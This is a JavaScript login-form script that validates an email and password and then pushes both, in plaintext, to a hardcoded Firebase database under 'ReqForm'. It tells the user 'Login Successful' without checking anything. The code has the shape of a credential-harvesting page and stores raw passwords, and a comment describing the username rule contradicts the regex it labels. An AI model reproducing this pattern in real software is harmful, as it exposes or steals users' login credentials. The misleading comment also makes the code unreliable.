  const form = document.getElementById("loginForm");
  const username = document.getElementById("username");
  const password = document.getElementById("password");

  const userError = document.getElementById("userError");
  const passError = document.getElementById("passError");

  form.addEventListener("submit", function(e) {
    e.preventDefault(); // prevent page reload

    let isValid = true;

    // Username regex: 3-10 chars, letters only
    const userRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Password regex: min 6 chars, 1 number, 1 special char
    const passRegex = /^(?=.*[0-9])(?=.*[!@#$%^&*])[A-Za-z0-9!@#$%^&*]{6,}$/;

    // Username validation
    if (!userRegex.test(username.value)) {
      userError.style.display = "block";
      isValid = false;
    } else {
      userError.style.display = "none";
    }

    // Password validation
    if (!passRegex.test(password.value)) {
      passError.style.display = "block";
      isValid = false;
    } else {
      passError.style.display = "none";
    }

    if (isValid) {
      alert("Login Successful 🚀");
      savedata(username.value, password.value);
      form.reset();
    }
  });

const savedata = (email, password) => {
  const firebaseConfig = {
    apiKey: "AIzaSyAFJXP9tJKRtKpfCsB4WoEfi0YyPchGopQ",
    authDomain: "login-page-cd1db.firebaseapp.com",
    databaseURL: "https://login-page-cd1db-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "login-page-cd1db",
    storageBucket: "login-page-cd1db.firebasestorage.app",
    messagingSenderId: "219059664176",
    appId: "1:219059664176:web:d59bce26537c03f05e44f5"
  };
  
  firebase.initializeApp(firebaseConfig);
  
  const db = firebase.database().ref("ReqForm");
  
  db.push({
    email: email,
    password: password,
  });
}

